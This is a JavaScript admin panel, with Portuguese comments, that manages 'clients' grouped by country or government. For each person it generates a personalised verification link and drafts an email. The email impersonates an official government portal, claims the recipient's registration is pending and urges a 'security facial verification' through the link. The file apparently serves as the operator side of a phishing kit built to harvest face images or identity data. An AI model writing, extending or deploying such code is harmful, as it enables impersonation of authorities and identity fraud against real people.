/* ============================================================
   admin.js — gerenciador de clientes (editar, copiar, e-mail, excluir)
   ============================================================ */
(function () {
  'use strict';
  var PAISES = window.PAISES || {};
  var Store = window.PV.Store;
  var filter = 'all';
  var tabs = document.getElementById('filters');
  var table = document.getElementById('table');
  var esc = window.PV.esc;

  function baseURL(code, nome) {
    var u = new URL(code + '/index.html', location.href);
    if (nome) u.searchParams.set('nome', nome);
    u.searchParams.set('verificar', '1');
    return u.href;
  }

  function renderFilters() {
    var html = '<button class="fchip' + (filter === 'all' ? ' on' : '') + '" data-f="all">Todos</button>';
    Object.keys(PAISES).forEach(function (c) {
      html += '<button class="fchip' + (filter === c ? ' on' : '') + '" data-f="' + c + '">' +
        PAISES[c].bandeira + ' ' + esc(PAISES[c].nome) + ' (' + Store.list(c).length + ')</button>';
    });
    tabs.innerHTML = html;
    tabs.querySelectorAll('.fchip').forEach(function (b) {
      b.addEventListener('click', function () { filter = b.getAttribute('data-f'); renderFilters(); renderTable(); });
    });
  }

  function renderTable() {
    var codes = filter === 'all' ? Object.keys(PAISES) : [filter];
    var rows = [];
    codes.forEach(function (c) {
      Store.list(c).forEach(function (it) { rows.push({ code: c, it: it }); });
    });
    if (!rows.length) { table.innerHTML = '<div class="empty">Nenhum cliente' + (filter === 'all' ? ' cadastrado' : ' neste governo') + '.</div>'; return; }

    var html = '<table><thead><tr><th style="width:22%">País</th><th>Nome</th><th>E-mail</th><th style="width:300px">Ações</th></tr></thead><tbody>';
    rows.forEach(function (r) {
      var p = PAISES[r.code];
      html += '<tr data-id="' + r.it.id + '" data-code="' + r.code + '">' +
        '<td>' + p.bandeira + ' ' + esc(p.nome) + '</td>' +
        '<td><input class="inp" data-edit="nome" value="' + esc(r.it.nome) + '"></td>' +
        '<td><input class="inp" data-edit="email" value="' + esc(r.it.email) + '" placeholder="—"></td>' +
        '<td>' +
          '<button class="mini" data-save>salvar</button>' +
          '<button class="mini" data-copy>copiar link</button>' +
          '<button class="mini" data-mail>e-mail</button>' +
          '<button class="mini red" data-del>excluir</button>' +
        '</td></tr>';
    });
    table.innerHTML = html + '</tbody></table>';

    table.querySelectorAll('tr[data-id]').forEach(function (tr) {
      var id = tr.getAttribute('data-id'), code = tr.getAttribute('data-code');
      tr.querySelectorAll('[data-edit]').forEach(function (inp) {
        inp.addEventListener('input', function () {
          var patch = {}; patch[inp.getAttribute('data-edit')] = inp.value.trim();
          Store.update(code, id, patch);
        });
        inp.addEventListener('blur', function () { renderFilters(); });
      });
      tr.querySelector('[data-save]').addEventListener('click', function () { window.PV.toast('Alterações salvas.'); renderFilters(); });
      tr.querySelector('[data-copy]').addEventListener('click', function () {
        var nome = tr.querySelector('[data-edit="nome"]').value.trim();
        copy(baseURL(code, nome));
      });
      tr.querySelector('[data-mail]').addEventListener('click', function () {
        var nome = tr.querySelector('[data-edit="nome"]').value.trim();
        var mail = tr.querySelector('[data-edit="email"]').value.trim();
        sendMail(code, nome, mail);
      });
      tr.querySelector('[data-del]').addEventListener('click', function () {
        if (confirm('Excluir "' + tr.querySelector('[data-edit="nome"]').value + '"?')) {
          Store.remove(code, id); renderFilters(); renderTable();
        }
      });
    });
  }

  function copy(txt) {
    if (navigator.clipboard) navigator.clipboard.writeText(txt).then(function () { window.PV.toast('Link copiado!'); }, fb); else fb();
    function fb() { var t = document.createElement('textarea'); t.value = txt; document.body.appendChild(t); t.select(); try { document.execCommand('copy'); } catch (e) {} t.remove(); window.PV.toast('Link copiado!'); }
  }

  function sendMail(code, nome, mail) {
    var p = PAISES[code];
    var url = baseURL(code, nome);
    var first = nome.split(' ')[0];
    var subject = 'Verificação de processo em andamento — ' + p.portal;
    var body = 'Olá, ' + first + '!\n\nSeu processo de cadastramento junto a ' + p.oficial +
      ' está em andamento e precisa de uma etapa de confirmação.\n\n' +
      'Faça a verificação facial de segurança pelo link:\n' + url + '\n\nEquipe ' + p.portal;
    window.location.href = 'mailto:' + encodeURIComponent(mail || '') + '?subject=' + encodeURIComponent(subject) + '&body=' + encodeURIComponent(body);
    window.PV.toast('Abrindo seu e-mail...');
  }

  document.getElementById('export').addEventListener('click', function () {
    var blob = new Blob([JSON.stringify(Store.all(), null, 2)], { type: 'application/json' });
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob); a.download = 'clientes-painel-verificacao.json'; a.click();
    URL.revokeObjectURL(a.href);
  });
  document.getElementById('import').addEventListener('click', function () { document.getElementById('file').click(); });
  document.getElementById('file').addEventListener('change', function (e) {
    var f = e.target.files[0]; if (!f) return;
    var fr = new FileReader();
    fr.onload = function () {
      try {
        var data = JSON.parse(fr.result);
        var all = Store.all();
        Object.keys(data).forEach(function (c) { all[c] = (all[c] || []).concat(data[c]); });
        localStorage.setItem('pv_clients_v1', JSON.stringify(all));
        renderFilters(); renderTable(); window.PV.toast('Backup importado.');
      } catch (err) { window.PV.toast('Arquivo inválido.'); }
    };
    fr.readAsText(f);
  });
  document.getElementById('clear').addEventListener('click', function () {
    if (confirm('Apagar TODOS os clientes de todos os governos?')) { localStorage.removeItem('pv_clients_v1'); renderFilters(); renderTable(); }
  });

  renderFilters();
  renderTable();
})();
